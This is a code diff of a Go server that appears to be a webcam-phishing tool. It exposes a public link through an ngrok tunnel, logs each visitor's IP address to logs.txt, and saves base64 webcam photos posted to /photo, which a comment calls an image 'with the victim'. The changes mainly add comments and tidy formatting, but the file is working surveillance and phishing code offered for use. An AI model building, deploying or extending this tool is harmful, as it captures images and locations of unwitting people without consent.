@@ -19,9 +19,11 @@ import (
 )
 
 var (
-	cono        int            = 0                                                  // this is for avoid problems
+	// this is for the errors
+	cono int = 0
+	// this detect the ngrok url                                              // this is for avoid problems
 	detectNgrok *regexp.Regexp = regexp.MustCompile("https://+[a-z0-9]+.ngrok.io") // this is the regex for get the url
-
+	// im using ansi colors for this so sometimes when someone is using something like windows it doesn't look good
 	logo string = "" +
 		"                                                              \033[36m     GGGGGGGG          \n" +
 		"                                                                 GlGGGGGG1GGG        \n" +
@@ -49,15 +51,17 @@ var (
 		"   00:1G  GGG| 0|      \n"
 )
 
+// the body of the request
 type photo struct {
 	Photo string `json:"img"`
 }
 
+// this decode the base64 into a io.Reader
 func imagePNG(input string) io.Reader {
 	return base64.NewDecoder(base64.StdEncoding, strings.NewReader(input))
 }
 
-
+// receive,decode and create an image with the victim
 func saycheese(_ http.ResponseWriter, r *http.Request) {
 	log.Println("\nNew photo")
 	// decode the bodyrequest
@@ -88,6 +92,8 @@ func saycheese(_ http.ResponseWriter, r *http.Request) {
 	png.Encode(fs, im)
 
 }
+
+// this create an archive if doesn't exist or add new info to the file logs.txt
 func writeIP(w http.ResponseWriter, r *http.Request) {
 	// create or open the file
 	fs, err := ioutil.ReadFile("logs.txt")
@@ -107,10 +113,17 @@ func writeIP(w http.ResponseWriter, r *http.Request) {
 	// send the pages
 	http.ServeFile(w, r, "view"+r.URL.Path)
 }
+
+/*
+nayNgrok
+this made a request to the api of ngrok
+
+http://127.0.0.1:4040/api/tunnels
+*/
 func sayNgrok() {
 	// wait a second
 
-	time.Sleep(time.Second*1) // make the petition
+	time.Sleep(time.Second * 1) // make the petition
 
 	res, err := http.Get("http://127.0.0.1:4040/api/tunnels")
 	if err != nil && cono <= 10 {
@@ -145,30 +158,34 @@ func main() {
 	// start the interface
 	fmt.Printf("\033[35m%s\n\033[0m", logo)
 	fmt.Println("\033[34mstarting  server \033[0m")
+
 	/// some stuff for do this work
-	cmd:= exec.Command("./ngrok", "http", "8080")
+	cmd := exec.Command("./ngrok", "http", "8080")
 	go func() {
-		// ejecuta el comando para ejecutar ngrok
-		fmt.Println("I need ngrok!, if you don't have ngrok, try `sudo apt install ngrok`")
+
 		if err := cmd.Run(); err != nil {
 			cmd = exec.Command("ngrok", "http", "8080")
 			if err := cmd.Run(); err != nil {
 				log.Println(err)
-				//fmt.Println("\033[31minstall ngrok for use this\033[0m")
-			}	
-		}	
+				fmt.Println("I need ngrok!, if you don't have ngrok, try `sudo apt install ngrok` if you are on a distro based on debian")
+			}
+		}
 	}()
-	// stop the process
+
+	// stop the process when you type ctrl c
 	c := make(chan os.Signal)
 	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
-	go func(){
+	go func() {
 		<-c
 		if err := cmd.Process.Kill(); err != nil {
 			log.Println(err.Error())
 		}
 		os.Exit(0)
 	}()
+	// then say the ngrok link obviously
 	sayNgrok()
+
+	// the routes
 	http.HandleFunc("/", writeIP)
 	http.HandleFunc("/photo", saycheese)
 	http.ListenAndServe(":8080", nil)
